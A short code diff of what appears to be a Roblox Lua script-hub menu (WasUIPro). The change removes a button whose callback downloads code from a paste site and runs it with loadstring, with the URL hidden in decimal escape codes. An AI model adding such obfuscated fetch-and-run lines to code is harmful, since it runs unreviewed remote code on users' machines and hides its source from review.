@@ -155,14 +155,5 @@ advancedCategory:Button({
         WasUIPro:Notify({ Title = "按钮", Content = "已切换其他脚本", Duration = 2 })
         end
 })
-advancedCategory:Button({
-    Text = "TX脚本",
-    Icon = "play",
-    Tooltip = "切换TX脚本",
-    Callback = function()
-        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\54\52\68\99\116\76\77\53\47\114\97\119"))()
-        WasUIPro:Notify({ Title = "按钮", Content = "已切换其他脚本", Duration = 2 })
-        end
-})
 
 WasUIPro:Notify({ Title = "初始化", Content = "WasUIPro 示例加载完成", Duration = 4 })
